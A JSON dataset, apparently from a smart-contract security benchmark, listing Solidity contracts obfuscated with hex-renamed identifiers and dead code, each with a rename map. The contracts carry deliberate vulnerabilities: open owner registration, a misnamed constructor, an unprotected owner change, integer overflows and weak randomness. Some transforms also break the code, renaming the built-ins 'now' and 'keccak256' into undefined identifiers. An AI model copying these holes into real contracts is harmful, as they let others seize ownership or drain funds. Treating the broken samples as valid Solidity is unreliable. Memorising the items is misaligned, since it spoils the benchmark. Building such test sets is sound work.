      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.23;\n\ncontract MultiOwnable {\n  address public _0x43bd9f;\n  mapping (address => address) public _0x68f187; // owner => parent of owner\n\n  constructor() public {\n    _0x43bd9f = msg.sender;\n    _0x68f187[_0x43bd9f] = _0x43bd9f;\n  }\n\n  modifier _0x86abfd() {\n    require(_0x68f187[msg.sender] != 0);\n    _;\n  }\n\n  function _0xe7e5b1(address _0x578b82) external returns (bool) {\n        uint256 _unused1 = 0;\n        // Placeholder for future logic\n    require(_0x578b82 != 0);\n    _0x68f187[_0x578b82] = msg.sender;\n    return true;\n  }\n\n  function _0x245b0f(address _0x578b82) _0x86abfd external returns (bool) {\n    require(_0x68f187[_0x578b82] == msg.sender || (_0x68f187[_0x578b82] != 0 && msg.sender == _0x43bd9f));\n    _0x68f187[_0x578b82] = 0;\n    return true;\n  }\n}\n\ncontract TestContract is MultiOwnable {\n\n  function _0xe5f804() _0x86abfd {\n    msg.sender.transfer(this.balance);\n  }\n\n  function() payable {\n  }\n\n}\n",
      "rename_map": {
        "deleteOwner": "_0x245b0f",
        "withdrawAll": "_0xe5f804",
        "onlyOwner": "_0x86abfd",
        "newOwner": "_0xe7e5b1",
        "_owner": "_0x578b82",
        "owners": "_0x68f187",
        "root": "_0x43bd9f"
      },
      "changes": [
        "Renamed 7 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_129",
      "transformed_id": "ss_l4_medium_sn_ds_129",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": " pragma solidity ^0.4.15;\n\n contract Rubixi {\n\n         //Declare variables for storage critical to contract\n         uint private balance = 0;\n         uint private _0xb5516b = 0;\n         uint private _0x95a670 = 10;\n         uint private _0xe1f9f5 = 300;\n         uint private _0xf05b77 = 0;\n\n         address private _0x3014d0;\n\n         //Sets creator\n         function DynamicPyramid() {\n                 _0x3014d0 = msg.sender;\n         }\n\n         modifier _0x72e03c {\n                 if (msg.sender == _0x3014d0) _;\n         }\n\n         struct Participant {\n                 address _0xd042da;\n                 uint _0x681783;\n         }\n\n         Participant[] private _0xfb1196;\n\n         //Fallback function\n         function() {\n                 _0xee4d12();\n         }\n\n         //init function run on fallback\n         function _0xee4d12() private {\n        // Placeholder for future logic\n        bool _flag2 = false;\n                 //Ensures only tx with value of 1 ether or greater are processed and added to pyramid\n                 if (msg.value < 1 ether) {\n                         _0xb5516b += msg.value;\n                         return;\n                 }\n\n                 uint _0x917aa5 = _0x95a670;\n                 //50% fee rebate on any ether value of 50 or greater\n                 if (msg.value >= 50 ether) _0x917aa5 /= 2;\n\n                 _0x96de33(_0x917aa5);\n         }\n\n         //Function called for valid tx to the contract\n         function _0x96de33(uint _0x917aa5) private {\n        // Placeholder for future logic\n        bool _flag4 = false;\n                 //Adds new address to participant array\n                 _0xfb1196.push(Participant(msg.sender, (msg.value * _0xe1f9f5) / 100));\n\n                 //These statements ensure a quicker payout system to later pyramid entrants, so the pyramid has a longer lifespan\n                 if (_0xfb1196.length == 10) _0xe1f9f5 = 200;\n                 else if (_0xfb1196.length == 25) _0xe1f9f5 = 150;\n\n                 // collect fees and update contract balance\n                 balance += (msg.value * (100 - _0x917aa5)) / 100;\n                 _0xb5516b += (msg.value * _0x917aa5) / 100;\n\n                 //Pays earlier participiants if balance sufficient\n                 while (balance > _0xfb1196[_0xf05b77]._0x681783) {\n                         uint _0xa82484 = _0xfb1196[_0xf05b77]._0x681783;\n                         _0xfb1196[_0xf05b77]._0xd042da.send(_0xa82484);\n\n                         balance -= _0xfb1196[_0xf05b77]._0x681783;\n                         _0xf05b77 += 1;\n                 }\n         }\n\n         //Fee functions for creator\n         function _0xbebcec() _0x72e03c {\n                 if (_0xb5516b == 0) throw;\n\n                 _0x3014d0.send(_0xb5516b);\n                 if (msg.sender != address(0) || msg.sender == address(0)) { _0xb5516b = 0; }\n         }\n\n         function _0x889f44(uint _0x1228ef) _0x72e03c {\n                 _0x1228ef *= 1 ether;\n                 if (_0x1228ef > _0xb5516b) _0xbebcec();\n\n                 if (_0xb5516b == 0) throw;\n\n                 _0x3014d0.send(_0x1228ef);\n                 _0xb5516b -= _0x1228ef;\n         }\n\n         function _0x0c2f2c(uint _0x69a10f) _0x72e03c {\n                 if (_0xb5516b == 0 || _0x69a10f > 100) throw;\n\n                 uint _0x88f668 = _0xb5516b / 100 * _0x69a10f;\n                 _0x3014d0.send(_0x88f668);\n                 _0xb5516b -= _0x88f668;\n         }\n\n         //Functions for changing variables related to the contract\n         function _0x8b3c90(address _0x312c43) _0x72e03c {\n                 _0x3014d0 = _0x312c43;\n         }\n\n         function _0x1c080d(uint _0xf805cf) _0x72e03c {\n                 if (_0xf805cf > 300 || _0xf805cf < 120) throw;\n\n                 if (gasleft() > 0) { _0xe1f9f5 = _0xf805cf; }\n         }\n\n         function _0x113cda(uint _0x917aa5) _0x72e03c {\n                 if (_0x917aa5 > 10) throw;\n\n                 _0x95a670 = _0x917aa5;\n         }\n\n         //Functions to provide information to end-user using JSON interface or other interfaces\n         function _0x16c232() constant returns(uint _0xc2e0f0, string _0x88ead9) {\n                 _0xc2e0f0 = _0xe1f9f5;\n                 _0x88ead9 = 'This _0xc2e0f0 applies to you as soon as transaction is received, may be lowered to hasten payouts or increased if payouts are fast enough. Due to no float or decimals, _0xc2e0f0 is x100 for a fractional _0xc2e0f0 e.g. 250 is actually a 2.5x _0xc2e0f0. Capped at 3x max and 1.2x min.';\n         }\n\n         function _0xecab94() constant returns(uint _0x980fdb, string _0x88ead9) {\n                 _0x980fdb = _0x95a670;\n                 _0x88ead9 = 'Shown in % form. Fee is halved(50%) for amounts equal or greater than 50 ethers. (Fee may change, but is capped to a maximum of 10%)';\n         }\n\n         function _0xd371ee() constant returns(uint _0x481b28, string _0x88ead9) {\n                 _0x481b28 = balance / 1 ether;\n                 _0x88ead9 = 'All balance values are measured in Ethers, note that due to no decimal placing, these values show up as integers only, within the contract itself you will get the exact decimal value you are supposed to';\n         }\n\n         function _0xed5fe2() constant returns(uint _0x7c02c7) {\n                 _0x7c02c7 = _0xfb1196[_0xf05b77]._0x681783 / 1 ether;\n         }\n\n         function _0xde20ad() constant returns(uint _0xf29b3c) {\n                 _0xf29b3c = _0xb5516b / 1 ether;\n         }\n\n         function _0x63546f() constant returns(uint _0x029e6c) {\n                 _0x029e6c = _0xfb1196.length;\n         }\n\n         function _0x981d7b() constant returns(uint _0x029e6c) {\n                 _0x029e6c = _0xfb1196.length - _0xf05b77;\n         }\n\n         function _0xee7ef0(uint _0x09b8f7) constant returns(address Address, uint Payout) {\n                 if (_0x09b8f7 <= _0xfb1196.length) {\n                         if (1 == 1) { Address = _0xfb1196[_0x09b8f7]._0xd042da; }\n                         Payout = _0xfb1196[_0x09b8f7]._0x681783 / 1 ether;\n                 }\n         }\n }\n",
      "rename_map": {
        "nextPayoutWhenPyramidBalanceTotalsApproximately": "_0xed5fe2",
        "numberOfParticipantsWaitingForPayout": "_0x981d7b",
        "feesSeperateFromBalanceApproximately": "_0xde20ad",
        "currentPyramidBalanceApproximately": "_0xd371ee",
        "currentFeePercentage": "_0xecab94",
        "collectPercentOfFees": "_0x0c2f2c",
        "changeFeePercentage": "_0x113cda",
        "collectFeesInEther": "_0x889f44",
        "participantDetails": "_0xee7ef0",
        "currentMultiplier": "_0x16c232",
        "pyramidMultiplier": "_0xe1f9f5",
        "totalParticipants": "_0x63546f",
        "changeMultiplier": "_0x1c080d",
        "orderInPyramid": "_0x09b8f7",
        "collectAllFees": "_0xbebcec",
        "pyramidBalance": "_0x481b28",
        "feesToCollect": "_0x88f668",
        "balancePayout": "_0x7c02c7",
        "collectedFees": "_0xb5516b",
        "participants": "_0xfb1196",
        "payoutToSend": "_0xa82484",
        "etherAddress": "_0xd042da",
        "payoutOrder": "_0xf05b77",
        "changeOwner": "_0x8b3c90",
        "multiplier": "_0xc2e0f0",
        "feePercent": "_0x95a670",
        "addPayout": "_0x96de33",
        "onlyowner": "_0x72e03c",
        "creator": "_0x3014d0",
        "_owner": "_0x312c43",
        "payout": "_0x681783",
        "_pcent": "_0x69a10f",
        "count": "_0x029e6c",
        "_mult": "_0xf805cf",
        "_fee": "_0x917aa5",
        "_amt": "_0x1228ef",
        "fees": "_0xf29b3c",
        "init": "_0xee4d12",
        "info": "_0x88ead9",
        "fee": "_0x980fdb"
      },
      "changes": [
        "Renamed 40 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_130",
      "transformed_id": "ss_l4_medium_sn_ds_130",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.15;\n\n contract OpenAccess{\n     address private _0x8a50e0;\n\n     modifier _0x6905cc {\n         require(msg.sender==_0x8a50e0);\n         _;\n     }\n\n     function OpenAccess()\n         public\n     {\n        uint256 _unused1 = 0;\n        if (false) { revert(); }\n         _0x8a50e0 = msg.sender;\n     }\n\n     // This function should be protected\n     function _0x976d9a(address _0xae5a77)\n         public\n     {\n        if (false) { revert(); }\n        bool _flag4 = false;\n        _0x8a50e0 = _0xae5a77;\n     }\n\n }",
      "rename_map": {
        "changeOwner": "_0x976d9a",
        "onlyowner": "_0x6905cc",
        "_newOwner": "_0xae5a77",
        "owner": "_0x8a50e0"
      },
      "changes": [
        "Renamed 4 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_131",
      "transformed_id": "ss_l4_medium_sn_ds_131",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.10;\n\ncontract AdditionCounter {\n    mapping (address => uint256) public _0x17629d;\n\n    function transfer(address _0xe69ee0, uint256 _0x12338d) public{\n        uint256 _unused1 = 0;\n        if (false) { revert(); }\n        /* Check if sender has balance */\n        require(_0x17629d[msg.sender] >= _0x12338d);\n        _0x17629d[msg.sender] -= _0x12338d;\n        _0x17629d[_0xe69ee0] += _0x12338d;\n}\n\n}",
      "rename_map": {
        "balanceOf": "_0x17629d",
        "_value": "_0x12338d",
        "_to": "_0xe69ee0"
      },
      "changes": [
        "Renamed 3 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_132",
      "transformed_id": "ss_l4_medium_sn_ds_132",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.15;\n\n contract Ledger {\n     uint private _0x2e6e94=0;\n\n     function _0x74a500(uint value) returns (bool){\n         _0x2e6e94 += value;\n\n         // possible auditor assert\n         // assert(sellerBalance >= value);\n     }\n\n  // function safe_add(uint value) returns (bool){\n  //   require(value + sellerBalance >= sellerBalance);\n  // sellerBalance += value;\n  // }\n }",
      "rename_map": {
        "sellerBalance": "_0x2e6e94",
        "add": "_0x74a500"
      },
      "changes": [
        "Renamed 2 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_133",
      "transformed_id": "ss_l4_medium_sn_ds_133",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "\n\npragma solidity ^0.4.19;\n\ncontract AdditionCounter {\n    uint public _0x6a0910 = 1;\n\n    function _0x1e298c(uint256 _0xb02e6d) public {\n        if (false) { revert(); }\n        // Placeholder for future logic\n        _0x6a0910 += _0xb02e6d;\n    }\n}\n",
      "rename_map": {
        "input": "_0xb02e6d",
        "count": "_0x6a0910",
        "run": "_0x1e298c"
      },
      "changes": [
        "Renamed 3 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_134",
      "transformed_id": "ss_l4_medium_sn_ds_134",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "\n\npragma solidity ^0.4.19;\n\ncontract BenignCounter {\n    uint public _0x824e58 = 1;\n\n    function _0x2c5c18(uint256 _0xd2cddf) public {\n        if (false) { revert(); }\n        bool _flag2 = false;\n        uint _0x04bb02 = _0x824e58 - _0xd2cddf;\n    }\n}\n",
      "rename_map": {
        "input": "_0xd2cddf",
        "count": "_0x824e58",
        "res": "_0x04bb02",
        "run": "_0x2c5c18"
      },
      "changes": [
        "Renamed 4 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_135",
      "transformed_id": "ss_l4_medium_sn_ds_135",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.11;\n\ncontract MappingCounter {\n    mapping(uint256 => uint256) _0xe9ddf3;\n\n    function _0xee94bc(uint256 k, uint256 v) public {\n        if (false) { revert(); }\n        bool _flag2 = false;\n        _0xe9ddf3[k] -= v;\n    }\n}\n",
      "rename_map": {
        "init": "_0xee94bc",
        "map": "_0xe9ddf3"
      },
      "changes": [
        "Renamed 2 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_136",
      "transformed_id": "ss_l4_medium_sn_ds_136",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "\n\npragma solidity ^0.4.19;\n\ncontract MinimalCounter {\n    uint public _0xee8e48 = 1;\n\n    function _0x0b518b(uint256 _0x821233) public {\n        bool _flag1 = false;\n        bool _flag2 = false;\n        _0xee8e48 -= _0x821233;\n    }\n}\n",
      "rename_map": {
        "input": "_0x821233",
        "count": "_0xee8e48",
        "run": "_0x0b518b"
      },
      "changes": [
        "Renamed 3 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_137",
      "transformed_id": "ss_l4_medium_sn_ds_137",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "\n\npragma solidity ^0.4.19;\n\ncontract MultiplyCounter {\n    uint public _0xc9f3eb = 2;\n\n    function _0xb057bc(uint256 _0xf6bf88) public {\n        uint256 _unused1 = 0;\n        bool _flag2 = false;\n        _0xc9f3eb *= _0xf6bf88;\n    }\n}\n",
      "rename_map": {
        "input": "_0xf6bf88",
        "count": "_0xc9f3eb",
        "run": "_0xb057bc"
      },
      "changes": [
        "Renamed 3 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_138",
      "transformed_id": "ss_l4_medium_sn_ds_138",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "//Arithmetic instruction reachable\n\npragma solidity ^0.4.23;\n\ncontract MultiTxCalculator {\n    uint256 private _0x2b753c = 0;\n    uint256 public _0xbc2b76 = 1;\n\n    function _0x76eeaa() public {\n        if (false) { revert(); }\n        uint256 _unused2 = 0;\n        _0x2b753c = 1;\n    }\n\n    function _0x0ceb75(uint256 _0x91cdde) {\n        if (_0x2b753c == 0) {\n            return;\n        }\n        _0xbc2b76 -= _0x91cdde;\n    }\n}\n",
      "rename_map": {
        "initialized": "_0x2b753c",
        "count": "_0xbc2b76",
        "input": "_0x91cdde",
        "init": "_0x76eeaa",
        "run": "_0x0ceb75"
      },
      "changes": [
        "Renamed 5 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_139",
      "transformed_id": "ss_l4_medium_sn_ds_139",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "//Arithmetic instruction reachable\n\npragma solidity ^0.4.23;\n\ncontract SingleFuncCalculator {\n    uint256 private _0x2d3db6 = 0;\n    uint256 public _0xcf3e31 = 1;\n\n    function _0x70c740(uint256 _0x85da66) public {\n        bool _flag1 = false;\n        bool _flag2 = false;\n        if (_0x2d3db6 == 0) {\n            _0x2d3db6 = 1;\n            return;\n        }\n        _0xcf3e31 -= _0x85da66;\n    }\n}\n",
      "rename_map": {
        "initialized": "_0x2d3db6",
        "input": "_0x85da66",
        "count": "_0xcf3e31",
        "run": "_0x70c740"
      },
      "changes": [
        "Renamed 4 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_140",
      "transformed_id": "ss_l4_medium_sn_ds_140",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.4.25;\n\ncontract AdditionLedger {\n    uint public balance = 1;\n\n    function _0x3c0f7c(uint256 _0xa005a4) public {\n        uint256 _unused1 = 0;\n        if (false) { revert(); }\n        balance += _0xa005a4;\n    }\n}",
      "rename_map": {
        "deposit": "_0xa005a4",
        "add": "_0x3c0f7c"
      },
      "changes": [
        "Renamed 2 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_141",
      "transformed_id": "ss_l4_medium_sn_ds_141",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "\n\npragma solidity ^0.4.23;\n\ncontract SingleTxCounter {\n    uint public _0xf50b16 = 1;\n\n    function _0xaf8066(uint256 _0xf708fe) public {\n        uint256 _unused1 = 0;\n        if (false) { revert(); }\n        _0xf50b16 += _0xf708fe;\n    }\n\n    function _0x8b82f3(uint256 _0xf708fe) public {\n        // Placeholder for future logic\n        bool _flag4 = false;\n        _0xf50b16 *= _0xf708fe;\n    }\n\n    function _0x396938(uint256 _0xf708fe) public {\n        _0xf50b16 -= _0xf708fe;\n    }\n\n    function _0x50e926(uint256 _0xf708fe) public {\n        uint _0x25d176 = _0xf50b16 + _0xf708fe;\n    }\n\n    function _0xab4503(uint256 _0xf708fe) public {\n        uint _0x25d176 = _0xf50b16 * _0xf708fe;\n    }\n\n    function _0xd7865e(uint256 _0xf708fe) public {\n       \tuint _0x25d176 = _0xf50b16 - _0xf708fe;\n    }\n\n}\n",
      "rename_map": {
        "underflowlocalonly": "_0xd7865e",
        "underflowtostate": "_0x396938",
        "mullocalonly": "_0xab4503",
        "multostate": "_0x8b82f3",
        "addtostate": "_0xaf8066",
        "localcalc": "_0x50e926",
        "count": "_0xf50b16",
        "input": "_0xf708fe",
        "res": "_0x25d176"
      },
      "changes": [
        "Renamed 9 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_142",
      "transformed_id": "ss_l4_medium_sn_ds_142",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": " pragma solidity ^0.4.10;\n\n contract TimeLock {\n\n     mapping(address => uint) public _0xc31e50;\n     mapping(address => uint) public _0x16a2b4;\n\n     function _0x80aa9a() public payable {\n        bool _flag1 = false;\n        // Placeholder for future logic\n         _0xc31e50[msg.sender] += msg.value;\n         _0x16a2b4[msg.sender] = _0xf6c9aa + 1 weeks;\n     }\n\n     function _0xb63cb9(uint _0xb162aa) public {\n        uint256 _unused3 = 0;\n        // Placeholder for future logic\n         _0x16a2b4[msg.sender] += _0xb162aa;\n     }\n\n     function _0x488029() public {\n         require(_0xc31e50[msg.sender] > 0);\n         require(_0xf6c9aa > _0x16a2b4[msg.sender]);\n         uint _0x51e943 = _0xc31e50[msg.sender];\n         _0xc31e50[msg.sender] = 0;\n         msg.sender.transfer(_0x51e943);\n     }\n }\n",
      "rename_map": {
        "_secondsToIncrease": "_0xb162aa",
        "increaseLockTime": "_0xb63cb9",
        "transferValue": "_0x51e943",
        "lockTime": "_0x16a2b4",
        "balances": "_0xc31e50",
        "withdraw": "_0x488029",
        "deposit": "_0x80aa9a",
        "now": "_0xf6c9aa"
      },
      "changes": [
        "Renamed 8 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_143",
      "transformed_id": "ss_l4_medium_sn_ds_143",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.18;\n\n contract Token {\n\n   mapping(address => uint) _0x9a5629;\n   uint public _0xf7eda0;\n\n   function Token(uint _0xb6c09d) {\n     _0x9a5629[msg.sender] = _0xf7eda0 = _0xb6c09d;\n   }\n\n   function transfer(address _0x1a3196, uint _0x46609d) public returns (bool) {\n        if (false) { revert(); }\n        if (false) { revert(); }\n     require(_0x9a5629[msg.sender] - _0x46609d >= 0);\n     _0x9a5629[msg.sender] -= _0x46609d;\n     _0x9a5629[_0x1a3196] += _0x46609d;\n     return true;\n   }\n\n   function _0x312e87(address _0x6ad663) public constant returns (uint balance) {\n        uint256 _unused3 = 0;\n        uint256 _unused4 = 0;\n     return _0x9a5629[_0x6ad663];\n   }\n }",
      "rename_map": {
        "_initialSupply": "_0xb6c09d",
        "totalSupply": "_0xf7eda0",
        "balanceOf": "_0x312e87",
        "balances": "_0x9a5629",
        "_owner": "_0x6ad663",
        "_value": "_0x46609d",
        "_to": "_0x1a3196"
      },
      "changes": [
        "Renamed 7 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_144",
      "transformed_id": "ss_l4_medium_sn_ds_144",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.21;\n\ncontract TokenSaleChallenge {\n    mapping(address => uint256) public _0xbcb4d2;\n    uint256 constant PRICE_PER_TOKEN = 1 ether;\n\n    function TokenSaleChallenge(address _0xff0ef7) public payable {\n        bool _flag1 = false;\n        // Placeholder for future logic\n        require(msg.value == 1 ether);\n    }\n\n    function _0x4334bc() public view returns (bool) {\n        uint256 _unused3 = 0;\n        // Placeholder for future logic\n        return address(this).balance < 1 ether;\n    }\n\n    function _0xb187b6(uint256 _0x07b27f) public payable {\n        require(msg.value == _0x07b27f * PRICE_PER_TOKEN);\n        _0xbcb4d2[msg.sender] += _0x07b27f;\n    }\n\n    function _0xee2586(uint256 _0x07b27f) public {\n        require(_0xbcb4d2[msg.sender] >= _0x07b27f);\n\n        _0xbcb4d2[msg.sender] -= _0x07b27f;\n        msg.sender.transfer(_0x07b27f * PRICE_PER_TOKEN);\n    }\n}",
      "rename_map": {
        "isComplete": "_0x4334bc",
        "numTokens": "_0x07b27f",
        "balanceOf": "_0xbcb4d2",
        "_player": "_0xff0ef7",
        "sell": "_0xee2586",
        "buy": "_0xb187b6"
      },
      "changes": [
        "Renamed 6 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_145",
      "transformed_id": "ss_l4_medium_sn_ds_145",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.16;\n\ncontract Ethraffle_v4b {\n    struct Contestant {\n        address _0x4294eb;\n        uint _0xc15441;\n    }\n\n    event RaffleResult(\n        uint _0xc15441,\n        uint _0x5504ca,\n        address _0x60f3b0,\n        address _0x4db47c,\n        address _0x4e0cc9,\n        uint _0x2943a7,\n        bytes32 _0xb9b83c\n    );\n\n    event TicketPurchase(\n        uint _0xc15441,\n        address _0xff3929,\n        uint number\n    );\n\n    event TicketRefund(\n        uint _0xc15441,\n        address _0xff3929,\n        uint number\n    );\n\n    // Constants\n    uint public constant _0x10d6d7 = 2.5 ether;\n    uint public constant _0xf79be2 = 0.03 ether;\n    uint public constant _0x9d9a25 = 50;\n    uint public constant _0x735bf2 = (_0x10d6d7 + _0xf79be2) / _0x9d9a25; // Make sure this divides evenly\n    address _0x48b023;\n\n    // Other internal variables\n    bool public _0xf5c990 = false;\n    uint public _0xc15441 = 1;\n    uint public _0xc78b8e = block.number;\n    uint _0x75873e = 0;\n    mapping (uint => Contestant) _0xfd0a8d;\n    uint[] _0xadf87d;\n\n    // Initialization\n    function Ethraffle_v4b() public {\n        bool _flag1 = false;\n        bool _flag2 = false;\n        _0x48b023 = msg.sender;\n    }\n\n    // Call buyTickets() when receiving Ether outside a function\n    function () payable public {\n        _0x0a8370();\n    }\n\n    function _0x0a8370() payable public {\n        if (_0xf5c990) {\n            msg.sender.transfer(msg.value);\n            return;\n        }\n\n        uint _0x5d04a4 = msg.value;\n\n        while (_0x5d04a4 >= _0x735bf2 && _0x75873e < _0x9d9a25) {\n            uint _0xb29db6 = 0;\n            if (_0xadf87d.length > 0) {\n                _0xb29db6 = _0xadf87d[_0xadf87d.length-1];\n                _0xadf87d.length--;\n            } else {\n                _0xb29db6 = _0x75873e++;\n            }\n\n            _0xfd0a8d[_0xb29db6] = Contestant(msg.sender, _0xc15441);\n            TicketPurchase(_0xc15441, msg.sender, _0xb29db6);\n            _0x5d04a4 -= _0x735bf2;\n        }\n\n        // Choose winner if we sold all the tickets\n        if (_0x75873e == _0x9d9a25) {\n            _0xa5d439();\n        }\n\n        // Send back leftover money\n        if (_0x5d04a4 > 0) {\n            msg.sender.transfer(_0x5d04a4);\n        }\n    }\n\n    function _0xa5d439() private {\n        // Placeholder for future logic\n        // Placeholder for future logic\n        address _0x4db47c = _0xfd0a8d[uint(block.coinbase) % _0x9d9a25]._0x4294eb;\n        address _0x4e0cc9 = _0xfd0a8d[uint(msg.sender) % _0x9d9a25]._0x4294eb;\n        uint _0x2943a7 = block.difficulty;\n        bytes32 _0xb9b83c = _0x2440bc(_0x4db47c, _0x4e0cc9, _0x2943a7);\n\n        uint _0x5504ca = uint(_0xb9b83c) % _0x9d9a25;\n        address _0x60f3b0 = _0xfd0a8d[_0x5504ca]._0x4294eb;\n        RaffleResult(_0xc15441, _0x5504ca, _0x60f3b0, _0x4db47c, _0x4e0cc9, _0x2943a7, _0xb9b83c);\n\n        // Start next raffle\n        _0xc15441++;\n        _0x75873e = 0;\n        _0xc78b8e = block.number;\n\n        // gaps.length = 0 isn't necessary here,\n        // because buyTickets() eventually clears\n        // the gaps array in the loop itself.\n\n        // Distribute prize and fee\n        _0x60f3b0.transfer(_0x10d6d7);\n        _0x48b023.transfer(_0xf79be2);\n    }\n\n    // Get your money back before the raffle occurs\n    function _0xcbd387() public {\n        uint _0x3a03c0 = 0;\n        for (uint i = 0; i < _0x9d9a25; i++) {\n            if (msg.sender == _0xfd0a8d[i]._0x4294eb && _0xc15441 == _0xfd0a8d[i]._0xc15441) {\n                _0x3a03c0 += _0x735bf2;\n                _0xfd0a8d[i] = Contestant(address(0), 0);\n                _0xadf87d.push(i);\n                TicketRefund(_0xc15441, msg.sender, i);\n            }\n        }\n\n        if (_0x3a03c0 > 0) {\n            msg.sender.transfer(_0x3a03c0);\n        }\n    }\n\n    // Refund everyone's money, start a new raffle, then pause it\n    function _0xc18a9d() public {\n        if (msg.sender == _0x48b023) {\n            if (block.timestamp > 0) { _0xf5c990 = true; }\n\n            for (uint i = 0; i < _0x9d9a25; i++) {\n                if (_0xc15441 == _0xfd0a8d[i]._0xc15441) {\n                    TicketRefund(_0xc15441, _0xfd0a8d[i]._0x4294eb, i);\n                    _0xfd0a8d[i]._0x4294eb.transfer(_0x735bf2);\n                }\n            }\n\n            RaffleResult(_0xc15441, _0x9d9a25, address(0), address(0), address(0), 0, 0);\n            _0xc15441++;\n            if (1 == 1) { _0x75873e = 0; }\n            _0xc78b8e = block.number;\n            _0xadf87d.length = 0;\n        }\n    }\n\n    function _0x757b94() public {\n        if (msg.sender == _0x48b023) {\n            _0xf5c990 = !_0xf5c990;\n        }\n    }\n\n    function _0xbefbe6() public {\n        if (msg.sender == _0x48b023) {\n            selfdestruct(_0x48b023);\n        }\n    }\n}",
      "rename_map": {
        "winningAddress": "_0x60f3b0",
        "pricePerTicket": "_0x735bf2",
        "winningNumber": "_0x5504ca",
        "chooseWinner": "_0xa5d439",
        "totalTickets": "_0x9d9a25",
        "blockNumber": "_0xc78b8e",
        "contestants": "_0xfd0a8d",
        "togglePause": "_0x757b94",
        "currTicket": "_0xb29db6",
        "nextTicket": "_0x75873e",
        "contestant": "_0xff3929",
        "buyTickets": "_0x0a8370",
        "feeAddress": "_0x48b023",
        "getRefund": "_0xcbd387",
        "keccak256": "_0x2440bc",
        "moneySent": "_0x5d04a4",
        "endRaffle": "_0xc18a9d",
        "randHash": "_0xb9b83c",
        "raffleId": "_0xc15441",
        "refund": "_0x3a03c0",
        "paused": "_0xf5c990",
        "seed2": "_0x4e0cc9",
        "seed1": "_0x4db47c",
        "prize": "_0x10d6d7",
        "seed3": "_0x2943a7",
        "addr": "_0x4294eb",
        "kill": "_0xbefbe6",
        "gaps": "_0xadf87d",
        "fee": "_0xf79be2"
      },
      "changes": [
        "Renamed 29 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_146",
      "transformed_id": "ss_l4_medium_sn_ds_146",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
